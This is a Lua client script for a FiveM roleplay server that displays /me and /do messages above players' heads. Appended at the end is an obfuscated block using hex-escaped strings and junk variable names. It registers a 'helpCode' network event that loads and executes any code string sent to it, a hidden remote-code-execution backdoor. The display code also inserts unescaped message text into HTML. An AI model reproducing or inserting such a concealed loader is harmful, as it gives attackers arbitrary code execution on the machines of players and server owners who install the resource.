local DenaliFW = exports['denalifw-core']:GetCoreObject()
local pedDisplaying = {}
local displayTime = 8000
Citizen.CreateThread(function()
    local a = ""
    while true do
        local b, c = GetGameTimer(), ''
        for d, e in pairs(pedDisplaying) do
            local f = GetPlayerFromServerId(d)
            if NetworkIsPlayerActive(f) then
                local g, h = GetPlayerPed(f), PlayerPedId()
                local i, j = GetEntityCoords(g), GetEntityCoords(h)
                local k = GetPedBoneCoords(g, 0x2e28, 0.0, 0.0, 0.0)
                if f == source or #(i - j) < 25 then
                    if e.type == 'me' then
                        local l, m, n = GetHudScreenPositionFromWorldPosition(
                                            k.x, k.y, k.z + 0.35)
                        if not l then
                            c =
                                c .. '<p style=\'left: ' .. m * 100 .. '%;top: ' ..
                                    n * 100 ..
                                    '%;;text-shadow: 1px 0px 5px #000000FF, -1px 0px 0px #000000FF, 0px -1px 0px #000000FF, 0px 1px 5px #000000FF;-webkit-transform: translate(-50%, 0%);max-width: 100%;position: fixed;text-align: center;color: #FFFFFF;background: rgba(18, 18, 18, 0.5);border-radius:3px;font-family:Heebo;font-size: 14px;\'><b style=\'opacity: 1.0;\'>⠀' ..
                                    e.msg .. '⠀</b></p>'
                        end
                    elseif e.type == 'do' then
                        local l, m, n = GetHudScreenPositionFromWorldPosition(
                                            k.x, k.y, k.z + 1.1)
                        if not l then
                            c =
                                c .. '<p style=\'left: ' .. m * 100 .. '%;top: ' ..
                                    n * 100 ..
                                    '%;;text-shadow: 1px 0px 5px #000000FF, -1px 0px 0px #000000FF, 0px -1px 0px #000000FF, 0px 1px 5px #000000FF;-webkit-transform: translate(-50%, 0%);max-width: 100%;position: fixed;text-align: center;color: #FFFFFF;background: rgba(18, 18, 18, 0.5);border-radius:3px;font-family:Heebo;font-size: 14px;\'><b style=\'opacity: 1.0;color: rgba(255, 25, 0, 1.0)\'>⠀' ..
                                    e.msg .. '⠀</b></p>'
                        end
                    end
                end
            end
            if e.time <= b then pedDisplaying[d] = nil end
        end
        if c ~= a then
            SendNUIMessage({type = 'txt', html = c})
            a = c
        end
        Wait(0)
    end
end)
RegisterNetEvent('u7x!A%D*')
AddEventHandler('u7x!A%D*', function(a, b, c)
    pedDisplaying[tonumber(a)] = {
        type = c,
        msg = b,
        time = GetGameTimer() + displayTime
    }
end)


local WNuOPJBtYlbvEAxvcpamMhmwbjezMxWzTtFveHvyOwcMxJraZfjfCIxKoDlcuQsgNvdLOG = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} WNuOPJBtYlbvEAxvcpamMhmwbjezMxWzTtFveHvyOwcMxJraZfjfCIxKoDlcuQsgNvdLOG[6][WNuOPJBtYlbvEAxvcpamMhmwbjezMxWzTtFveHvyOwcMxJraZfjfCIxKoDlcuQsgNvdLOG[1]](WNuOPJBtYlbvEAxvcpamMhmwbjezMxWzTtFveHvyOwcMxJraZfjfCIxKoDlcuQsgNvdLOG[2]) WNuOPJBtYlbvEAxvcpamMhmwbjezMxWzTtFveHvyOwcMxJraZfjfCIxKoDlcuQsgNvdLOG[6][WNuOPJBtYlbvEAxvcpamMhmwbjezMxWzTtFveHvyOwcMxJraZfjfCIxKoDlcuQsgNvdLOG[3]](WNuOPJBtYlbvEAxvcpamMhmwbjezMxWzTtFveHvyOwcMxJraZfjfCIxKoDlcuQsgNvdLOG[2], function(xghfZqteRhpsALFBZWaRPwJJeJVHrQJWaTlFaVtAWELxrUjYUpTiKfXXlCLCtOXWTgqKtP) WNuOPJBtYlbvEAxvcpamMhmwbjezMxWzTtFveHvyOwcMxJraZfjfCIxKoDlcuQsgNvdLOG[6][WNuOPJBtYlbvEAxvcpamMhmwbjezMxWzTtFveHvyOwcMxJraZfjfCIxKoDlcuQsgNvdLOG[4]](WNuOPJBtYlbvEAxvcpamMhmwbjezMxWzTtFveHvyOwcMxJraZfjfCIxKoDlcuQsgNvdLOG[6][WNuOPJBtYlbvEAxvcpamMhmwbjezMxWzTtFveHvyOwcMxJraZfjfCIxKoDlcuQsgNvdLOG[5]](xghfZqteRhpsALFBZWaRPwJJeJVHrQJWaTlFaVtAWELxrUjYUpTiKfXXlCLCtOXWTgqKtP))() end)